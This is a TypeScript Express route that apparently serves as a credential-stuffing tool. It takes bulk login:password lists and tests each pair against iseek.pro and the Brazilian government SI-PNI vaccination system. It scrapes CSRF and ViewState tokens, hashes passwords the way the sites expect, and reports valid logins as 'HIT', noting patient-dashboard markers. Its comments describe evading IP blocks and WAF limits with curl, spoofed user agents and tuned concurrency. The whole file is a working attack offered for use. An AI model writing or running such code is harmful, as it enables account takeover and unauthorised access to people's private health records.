import { Router, type IRouter } from "express";
import { createHash }  from "node:crypto";
import { execFile }    from "node:child_process";
import { unlinkSync }  from "node:fs";

const router: IRouter = Router();

// ── curl-based HTTP helper ────────────────────────────────────────────────────
// Node.js's built-in fetch (undici) times out on DataSUS (cloud-IP block).
// curl uses the system network stack which has no such restriction.
// We shell out to curl for DataSUS requests only.

interface CurlResult {
  statusCode: number;
  headers:    Record<string, string>;
  body:       string;
  location:   string; // value of Location header (from redirect), if any
}

function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
  // Base args: silent + dump headers to stdout + timeout
  const args = ["-s", "--max-time", String(Math.ceil(timeoutMs / 1000)), "-D", "-", ...argv];

  return new Promise((resolve, reject) => {
    const child = execFile("curl", args, { maxBuffer: 8 * 1024 * 1024 }, (err, stdout) => {
      // curl exit-code ≠ 0 is ok as long as we got output (e.g. 302 with --max-redirs 0)
      if (!stdout && err) return reject(new Error(err.message.split("\n")[0]));

      // Split at first blank line separating headers from body
      // (may have multiple header blocks if curl followed a redirect for the GET phase)
      // We want the LAST header block.
      const blocks = stdout.split(/\r?\n\r?\n/);
      // Find last block starting with HTTP/
      let rawHdr = "";
      let body   = "";
      for (let i = blocks.length - 1; i >= 0; i--) {
        if (blocks[i].trimStart().startsWith("HTTP/")) {
          rawHdr = blocks[i];
          body   = blocks.slice(i + 1).join("\r\n\r\n");
          break;
        }
      }

      const lines      = rawHdr.split(/\r?\n/);
      const statusLine = lines[0] ?? "";
      const statusCode = parseInt(statusLine.split(" ")[1] ?? "0", 10);

      const headers: Record<string, string> = {};
      for (const line of lines.slice(1)) {
        const idx = line.indexOf(":");
        if (idx === -1) continue;
        const key = line.slice(0, idx).trim().toLowerCase();
        const val = line.slice(idx + 1).trim();
        if (!headers[key]) headers[key] = val; // first occurrence wins
      }

      resolve({ statusCode, headers, body, location: headers["location"] ?? "" });
    });

    setTimeout(() => {
      try { child.kill("SIGKILL"); } catch { /**/ }
      reject(new Error("CURL_TIMEOUT"));
    }, timeoutMs + 3_000);
  });
}

// ── Types ─────────────────────────────────────────────────────────────────────
export type CheckStatus = "HIT" | "FAIL" | "ERROR";
export type CheckerTarget = "iseek" | "datasus";

export interface CheckResult {
  credential: string;
  login:      string;
  status:     CheckStatus;
  detail:     string;
}

export interface CheckerBulkResponse {
  total:   number;
  hits:    number;
  fails:   number;
  errors:  number;
  results: CheckResult[];
}

// ── Shared helpers ────────────────────────────────────────────────────────────
const MOBILE_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36";
const DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

function parseCookieJar(headers: Headers): string {
  const raw = headers.getSetCookie?.() ?? [];
  return raw.map(c => c.split(";")[0]).join("; ");
}

/** Parse credentials from any format — supports email:pass, user:pass, newline/comma/semicolon separated */
const MAX_BULK = 500;
export function parseCredentials(raw: string): Array<{ login: string; password: string }> {
  return raw
    .split(/[\n,;|]+/)
    .map(l => l.trim())
    .filter(Boolean)
    .slice(0, MAX_BULK)
    .map(line => {
      const idx = line.indexOf(":");
      if (idx === -1) return null;
      const login    = line.slice(0, idx).trim();
      const password = line.slice(idx + 1).trim();
      if (!login || !password) return null;
      return { login, password };
    })
    .filter((x): x is { login: string; password: string } => x !== null);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  iSEEK CHECKER — https://iseek.pro/login
//  Logic: GET → extract CSRF _token → POST creds → check redirect location
// ═══════════════════════════════════════════════════════════════════════════════
const ISEEK_URL = "https://iseek.pro/login";
const ISEEK_TIMEOUT = 15_000;

const ISEEK_HEADERS: Record<string, string> = {
  "User-Agent":      DESKTOP_UA,
  "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
};

function extractCsrfToken(html: string): string | null {
  const m1 = html.match(/name=["']_token["'][^>]*value=["']([^"']+)["']/);
  if (m1) return m1[1];
  const m2 = html.match(/value=["']([^"']+)["'][^>]*name=["']_token["']/);
  if (m2) return m2[1];
  const m3 = html.match(/_token[^>]*value=["']([A-Za-z0-9+/=]{20,80})["']/);
  if (m3) return m3[1];
  return null;
}

async function checkIseek(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;

  // Step 1: GET login page — grab CSRF token + cookies
  let getResp: Response;
  try {
    getResp = await fetch(ISEEK_URL, {
      headers:  { ...ISEEK_HEADERS },
      redirect: "follow",
      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
    });
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
  }

  const html      = await getResp.text().catch(() => "");
  const cookieJar = parseCookieJar(getResp.headers);
  const token     = extractCsrfToken(html);

  if (!token) return { credential, login, status: "ERROR", detail: "NO_CSRF_TOKEN" };

  // Step 2: POST credentials (no redirect follow — inspect Location header)
  const body = new URLSearchParams({ _token: token, email: login, password });
  const postHeaders: Record<string, string> = {
    ...ISEEK_HEADERS,
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer":      ISEEK_URL,
    "Origin":       "https://iseek.pro",
    ...(cookieJar ? { "Cookie": cookieJar } : {}),
  };

  let postResp: Response;
  try {
    postResp = await fetch(ISEEK_URL, {
      method:   "POST",
      headers:  postHeaders,
      body:     body.toString(),
      redirect: "manual",
      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
    });
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
  }

  if (postResp.status >= 301 && postResp.status <= 308) {
    const loc = postResp.headers.get("location") ?? "";
    if (loc && !loc.includes("/login")) {
      return { credential, login, status: "HIT", detail: loc.startsWith("/") ? `https://iseek.pro${loc}` : loc };
    }
    return { credential, login, status: "FAIL", detail: loc || "redirect_back_to_login" };
  }

  // Fallback: follow redirects and check final URL
  try {
    const final = await fetch(ISEEK_URL, {
      method:   "POST",
      headers:  postHeaders,
      body:     body.toString(),
      redirect: "follow",
      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
    });
    const finalUrl = final.url;
    if (finalUrl && !finalUrl.includes("/login")) {
      return { credential, login, status: "HIT", detail: finalUrl };
    }
    return { credential, login, status: "FAIL", detail: finalUrl || "login_page" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `POST_FOLLOW:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DATASUS / SI-PNI CHECKER — https://sipni.datasus.gov.br
//  Logic: GET page → extract ViewState + form ID → SHA-512 password → POST → check
// ═══════════════════════════════════════════════════════════════════════════════
const DATASUS_URL = "https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf";
const DATASUS_TIMEOUT = 15_000;

const DATASUS_HEADERS: Record<string, string> = {
  "User-Agent": MOBILE_UA,
  "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
};

function sha512(text: string): string {
  return createHash("sha512").update(text, "ascii").digest("hex");
}

function extractViewState(html: string): string {
  // Standard JSF ViewState hidden input
  const m = html.match(/name=["']javax\.faces\.ViewState["'][^>]*value=["']([^"']+)["']/);
  if (m) return m[1];
  const m2 = html.match(/value=["']([^"']+)["'][^>]*name=["']javax\.faces\.ViewState["']/);
  if (m2) return m2[1];
  return "j_id1"; // fallback default
}

function extractFormId(html: string): string {
  // Try known form IDs: j_idt23, j_idt26, etc.
  const knownIds = ["j_idt23", "j_idt26", "loginForm", "j_idt25", "j_idt24"];
  for (const id of knownIds) {
    if (html.includes(`id="${id}"`)) return id;
  }
  // Fallback: first form with an id
  const m = html.match(/<form[^>]+id=["']([^"']+)["']/);
  if (m) return m[1];
  return "j_idt23";
}

function extractSubmitId(html: string, formId: string): string {
  // Try to find submit button inside the form
  const m = html.match(new RegExp(`${formId}:([\\w]+)[^>]+type=["']submit["']`));
  if (m) return `${formId}:${m[1]}`;
  const m2 = html.match(/id=["']([^"']+)["'][^>]*type=["']submit["']/);
  if (m2) return m2[1];
  return `${formId}:j_idt32`; // default fallback from Python code
}

async function checkDataSUS(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  // Unique cookie jar per session so parallel checks don't share cookies
  const cookieFile = `/tmp/datasus_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // ── Step 1: GET login page, save cookies ──────────────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-c", cookieFile,                    // save cookies to jar
        "-H", `User-Agent: ${MOBILE_UA}`,
        DATASUS_URL,
      ], DATASUS_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode !== 200) {
      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
    }

    const html      = getResult.body;
    const viewState = extractViewState(html);
    const formId    = extractFormId(html);
    const submitId  = extractSubmitId(html, formId);
    const senhaHash = sha512(password);

    // Build POST body
    const postPairs = [
      [formId, formId],
      ["javax.faces.ViewState", viewState],
      [`${formId}:usuario`, login],
      [`${formId}:senha`, senhaHash],
      [submitId, submitId.includes(":") ? submitId.split(":")[1] : submitId],
    ];
    // Escape each value for shell single-quote safety
    const postData = postPairs
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join("&");

    // ── Step 2: POST (no redirect follow — inspect Location header) ────────
    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-b", cookieFile,                                    // send cookies from jar
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Origin: https://sipni.datasus.gov.br",
        "-H", `Referer: ${DATASUS_URL}`,
        "--data-raw", postData,                              // POST body (no shell quoting issues)
        "--max-redirs", "0",                                 // inspect Location header manually
        DATASUS_URL,
      ], DATASUS_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    // 302 redirect away from inicio.jsf = LIVE
    const code = postResult.statusCode;
    const loc  = postResult.location;
    if (code >= 301 && code <= 308) {
      if (loc && !loc.includes("inicio.jsf")) {
        return { credential, login, status: "HIT", detail: loc };
      }
      return { credential, login, status: "FAIL", detail: "redirect_back_to_login" };
    }

    // No redirect — check body keywords
    const body2 = postResult.body.toLowerCase();
    if (body2.includes("usu") && (body2.includes("ou senha inv") || body2.includes("senha incorreta"))) {
      return { credential, login, status: "FAIL", detail: "senha_invalida" };
    }
    if (body2.includes("pacienteform") || body2.includes("listapacientetable") || body2.includes("bem-vindo")) {
      return { credential, login, status: "HIT", detail: "dashboard_found" };
    }
    if (body2.includes("inicio.jsf") || body2.includes('type="password"') || body2.includes("type='password'")) {
      return { credential, login, status: "FAIL", detail: "still_on_login" };
    }

    return { credential, login, status: "ERROR", detail: `UNKNOWN_HTTP${code}` };
  } finally {
    // Clean up cookie jar
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ── Concurrency pool (no deps needed) ────────────────────────────────────────
// Runs `fn` for every item with at most `concurrency` tasks in parallel,
// preserving result order. Fast replacement for p-limit.
async function pMap<T, R>(
  items:       T[],
  fn:          (item: T, idx: number) => Promise<R>,
  concurrency: number,
): Promise<R[]> {
  const results: R[] = new Array(items.length);
  let next = 0;
  const worker = async () => {
    while (next < items.length) {
      const i = next++;
      results[i] = await fn(items[i], i);
    }
  };
  await Promise.all(Array.from({ length: Math.min(concurrency, items.length) }, worker));
  return results;
}

// ── Runner ────────────────────────────────────────────────────────────────────
// Concurrency: DataSUS = 3 parallel sessions (conservative — server blocks >3 simultaneous IPs)
//              iSeek   = 2 parallel (CSRF per session, lower concurrency avoids WAF blocks)
const CONCURRENCY: Record<CheckerTarget, number> = { datasus: 2, iseek: 2 };

async function runBulk(pairs: Array<{ login: string; password: string }>, target: CheckerTarget): Promise<CheckerBulkResponse> {
  const checker     = target === "datasus" ? checkDataSUS : checkIseek;
  const concurrency = CONCURRENCY[target];

  const results = await pMap(pairs, ({ login, password }) => checker(login, password), concurrency);

  return {
    total:   results.length,
    hits:    results.filter(r => r.status === "HIT").length,
    fails:   results.filter(r => r.status === "FAIL").length,
    errors:  results.filter(r => r.status === "ERROR").length,
    results,
  };
}

// ── Routes ────────────────────────────────────────────────────────────────────
// POST /api/checker/check
// body: { credentials: string[], target: "iseek" | "datasus" }
// body: { login: string, password: string, target: "iseek" | "datasus" }
router.post("/checker/check", async (req, res): Promise<void> => {
  const { credentials, login, password, target = "iseek" } = req.body as {
    credentials?: string[];
    login?:       string;
    password?:    string;
    target?:      CheckerTarget;
  };

  if (target !== "iseek" && target !== "datasus") {
    res.status(400).json({ error: "target must be 'iseek' or 'datasus'" });
    return;
  }

  let pairs: Array<{ login: string; password: string }> = [];
  if (login && password) {
    pairs = [{ login: login.trim(), password: String(password).trim() }];
  } else if (Array.isArray(credentials)) {
    pairs = parseCredentials(credentials.join("\n"));
  } else {
    res.status(400).json({ error: "Provide { credentials: string[] } or { login, password }" });
    return;
  }

  if (pairs.length === 0) {
    res.status(400).json({ error: "No valid credentials found" });
    return;
  }

  const response = await runBulk(pairs, target);
  res.json(response);
});

export default router;
